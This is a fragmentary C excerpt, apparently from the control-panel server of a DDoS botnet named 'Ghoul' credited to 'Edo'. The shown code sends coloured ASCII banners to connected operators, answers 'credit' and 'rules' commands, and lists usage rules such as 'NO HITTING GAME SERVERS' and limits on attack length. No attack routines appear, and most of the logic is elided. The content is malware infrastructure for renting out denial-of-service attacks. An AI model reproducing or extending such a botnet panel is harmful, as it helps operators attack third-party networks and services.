...
void *TitleWriter(void *sock) {
  ...
  sprintf(ascii_banner_line3,  "\e[38;5;93m                                ╚═╝╩ ╩╚═╝╚═╝╩═╝ Edo            \e[38;5;93m\r\n");
  ...
  sprintf(ascii_banner_line9,  "\e[38;5;93m                                                                \e[38;5;93m\r\n");
  ...
  if(send(datafd, ascii_banner_line9, strlen(ascii_banner_line9), MSG_NOSIGNAL) == -1) goto end;
		...
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
			...
			if(strstr(buf, "credit") || strstr(buf, "Owner") || strstr(buf, "CREDIT") || strstr(buf, "edo") || strstr(buf, "yqro") || strstr(buf, "PORTS")) {
                ...
                sprintf(s4,  "\e[38;5;93m  ║        \e[90mGhoul Was Made By Edo                 \e[38;5;93m║\r\n");
		...
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
			...
			if(strstr(buf, "rule") || strstr(buf, "RULE") || strstr(buf, "RULE") || strstr(buf, "rules") || strstr(buf, "RULES") || strstr(buf, "Rules")) {
				...
				sprintf(p7,  "\e[38;5;93m║   \e[90mRULE 5 NO HITTING GAME SERVERS   \e[38;5;93m    ║     \r\n"); 
				sprintf(p8,  "\e[38;5;93m║   \e[90mRULE 6 NO HITTING NFOs           \e[38;5;93m    ║     \r\n"); 
				sprintf(p9,  "\e[38;5;93m╚═╗ \e[90mRULE 7 NO ATTACKS LONGER THAN 100\e[38;5;93m  ╔═╝     \r\n");                       
				sprintf(p1,  "\e[38;5;93m  ╚════════════════════════════════════╝       \r\n");
...
int main (int argc, char *argv[], void *sock) {
		...
		port = atoi(argv[3]);
		printf("\e[38;5;93m[+] Welcome To Ghoul Made By Edo [+]\n");
        threads = atoi(argv[2]);
